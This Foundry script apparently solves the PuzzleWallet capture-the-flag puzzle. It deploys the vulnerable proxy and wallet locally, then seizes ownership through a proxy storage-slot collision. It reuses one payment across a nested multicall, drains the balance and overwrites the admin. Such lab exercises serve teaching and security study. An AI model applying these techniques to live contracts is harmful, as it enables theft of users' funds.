// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";

contract PuzzleWalletHack is Script {
    PuzzleWallet public wallet;
    PuzzleProxy public proxy;
    address public eoa = address(1024);

    function setUp() public {
        PuzzleWalletInit instance = new PuzzleWalletInit();
        proxy = PuzzleProxy(payable(instance.init()));
        wallet = PuzzleWallet(address(proxy));
        vm.deal(eoa, 5 ether);
        assert(proxy.admin() == wallet.owner());
    }

    function run() public {
        console.log("Before:", wallet.owner());
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory payload = new bytes[](2);
        payload[0] = abi.encodeWithSelector(wallet.deposit.selector);
        payload[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositSelector
        );
        vm.startPrank(eoa);
        proxy.proposeNewAdmin(eoa);
        wallet.addToWhitelist(eoa);
        wallet.multicall{value: 0.001 ether}(payload);
        wallet.execute(eoa, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(eoa)));
        vm.stopPrank();
        console.log("After:", wallet.owner());
    }
}

contract PuzzleWalletInit is Script {
    function init() public returns (address) {
        PuzzleWallet walletLogic = new PuzzleWallet();
        bytes memory data = abi.encodeWithSelector(
            PuzzleWallet.init.selector,
            100 ether
        );
        PuzzleProxy proxy = new PuzzleProxy(
            address(this),
            address(walletLogic),
            data
        );
        PuzzleWallet wallet = PuzzleWallet(address(proxy));

        vm.deal(address(this), 1 ether);

        wallet.addToWhitelist(address(this));
        wallet.deposit{value: 0.001 ether}();
        return address(proxy);
    }
}
